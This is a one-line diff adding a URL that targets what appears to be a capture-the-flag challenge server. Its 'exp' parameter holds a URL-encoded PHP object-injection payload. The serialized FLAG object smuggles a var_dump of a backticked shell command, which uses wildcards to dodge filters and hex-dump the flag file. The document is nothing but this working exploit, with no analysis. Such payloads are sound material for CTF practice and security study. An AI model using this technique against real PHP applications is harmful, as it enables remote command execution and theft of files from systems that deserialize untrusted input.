@@ -1,0 +1,1 @@
+http://challenge.bluesharkinfo.com:29023/?exp=O%3A4%3A%22FLAG%22%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A4%3A%22FLAG%22%3Bs%3A1%3A%22b%22%3Bs%3A23%3A%22%3Bvar_dump%28%60xxd+%2F%3Fl%3Fg%60%29%3B%22%3B%7D
